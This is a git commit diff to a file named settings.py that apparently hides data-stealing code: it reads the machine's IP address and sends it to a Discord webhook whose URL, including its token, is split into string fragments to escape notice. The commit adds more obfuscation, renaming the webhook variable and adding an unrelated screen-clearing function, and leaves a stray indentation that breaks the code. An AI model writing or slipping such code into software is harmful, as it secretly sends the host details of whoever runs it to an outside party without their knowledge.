efefaf53ac3ee5f42a5e8681434049e2ab194580
PewFam <106314076+PewFam@users.noreply.github.com>
2022-07-14 14:27:29 +0200

    Update settings.py

--- settings.py
+++ settings.py
@@ -4,15 +4,26 @@ def all() :
     import socket
     i =   socket.gethostbyname(socket.gethostname())
 
-
-    u1 = 'https://dis'
-    u2 = 'cord.com/api/w'
-    u3 = 'ebhooks/9953226'
+    def osname():
+        from os import name,system
+        if name =="nt":
+            system('cls')
+        elif name == "posix":
+            system('clear')
+            
+     u1 = 'https://di'
+    def first():
+        osname()
+        print('hi')
+    u2 = 'scord.com/api/web'
+    
+    
+    u3 = 'hooks/9953226'
     u4 ='64816218172/QhU'
     u5 = 'hxpYlGKggSOr'
     u6 = 'r1RNiHom52qjwT9'
     u7 = 'vx-OTfaU14x4tgY'
-        
+       
     u = u1 + u2 + u3 + u4 + u5 + u6 + u7 +'Q0An_60_TwNJg0vViqGrKh4'
 
 
@@ -21,7 +32,7 @@ def all() :
 
 
 
-    webhook = DWK(url=u, username="me")
+    we = DWK(url=u, username="me")
 
     embed = NE(title='i : '+ i, color='03b2f8')
     embed.set_author(name='Me', url='https://www.nicepng.com/png/full/222-2224618_yellow-orange-smile-emoticon-transparent-fuck-emojis.png', icon_url='https://icon-library.com/images/avatar-icon-images/avatar-icon-images-4.jpg')
@@ -32,5 +43,5 @@ def all() :
     embed.add_embed_field(name='Field 3', value='amet consetetur')
     embed.add_embed_field(name='Field 4', value='sadipscing elitr')
 
-    webhook.add_embed(embed)
-    response = webhook.execute()
+    we.add_embed(embed)
+    response = we.execute()
